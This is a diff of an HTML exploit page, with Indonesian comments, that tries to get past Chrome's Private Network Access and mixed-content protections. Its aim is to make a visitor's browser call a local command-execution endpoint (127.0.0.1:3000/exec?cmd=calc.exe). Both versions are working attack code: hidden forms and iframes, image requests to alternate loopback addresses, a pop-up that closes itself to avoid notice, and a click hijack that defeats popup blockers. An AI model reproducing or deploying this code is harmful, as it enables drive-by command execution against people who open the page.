@@ -1,40 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Bypassing Chrome PNA Policy</title>
+    <title>Chrome PNA & Mixed Content Bypass</title>
 </head>
-<body style="background:black; color:white; font-family:sans-serif; text-align:center;">
-    <h1>SYSTEM INTEGRITY CHECK</h1>
-    <p>Testing bypass on Private Network Access...</p>
-
-    <!-- Hidden form untuk bypass fetch policy -->
-    <form id="pwnForm" action="http://127.0.0.1:3000/exec" method="GET" target="hiddenFrame">
-        <input type="hidden" name="cmd" value="calc.exe">
-    </form>
-    <iframe name="hiddenFrame" style="display:none;"></iframe>
+<body style="background: #000; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px;">
+    <h1>SYSTEM VULNERABILITY TEST</h1>
+    <p style="color: #fff;">Attempting to bypass HTTPS -> HTTP (Mixed Content) Block...</p>
+    <div id="status">Status: Waiting for trigger...</div>
 
     <script>
-        async function advancedPwn() {
-            // Teknik 1: Auto-submit Form (Sering dianggap interaksi user tingkat rendah)
-            document.getElementById('pwnForm').submit();
+        // Gunakan IP 0.0.0.0 atau [::] untuk mencoba bypass filter IP 127.0.0.1
+        const targetHost = "http://127.0.0.1:3000/exec?cmd=calc.exe";
 
-            // Teknik 2: WebRTC IP Leakage & Connection
-            // Mencoba "menyentuh" localhost via jalur WebRTC
-            const pc = new RTCPeerConnection();
-            pc.createDataChannel("pwn");
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        function bypass() {
+            document.getElementById('status').innerText = "Status: Executing Bypass...";
 
-            // Teknik 3: Brute-force IP (0.0.0.0 vs 127.0.0.1 vs [::1])
-            const variations = ["http://127.0.0.1:3000", "http://0.0.0.0:3000", "http://[::]:3000"];
-            variations.forEach(host => {
-                const img = new Image();
-                img.src = `${host}/exec?cmd=calc.exe`;
-            });
+            // TEKNIK 1: Top-Level Navigation Bypass
+            // HTTPS -> HTTP diblokir untuk sub-resource (img/fetch), 
+            // tapi seringkali lolos jika lewat navigasi jendela baru/pop-up
+            const pwn = window.open(targetHost, "_blank", "width=100,height=100");
+            
+            // Tutup kembali pop-up dalam 1 detik agar tidak mencurigakan
+            setTimeout(() => { if(pwn) pwn.close(); }, 1000);
+
+            // TEKNIK 2: Iframe dengan Schema Berbeda
+            // Mencoba memaksa browser merender request
+            const ifr = document.createElement('iframe');
+            ifr.src = targetHost;
+            ifr.style.display = "none";
+            document.body.appendChild(ifr);
+
+            // TEKNIK 3: Form Post via HTTP
+            const form = document.createElement('form');
+            form.method = "GET";
+            form.action = targetHost;
+            form.target = "_blank"; // Membuka di tab baru untuk bypass Mixed Content
+            document.body.appendChild(form);
+            form.submit();
         }
 
-        window.onload = () => {
-            setTimeout(advancedPwn, 1000);
-        };
+        // Jalankan otomatis saat user klik di mana saja (untuk bypass popup blocker)
+        window.onclick = bypass;
+        
+        // Coba jalankan otomatis setelah 2 detik
+        setTimeout(bypass, 2000);
     </script>
+    <p style="margin-top: 50px; color: #555;">Click anywhere on this page if nothing happens.</p>
 </body>
 </html>
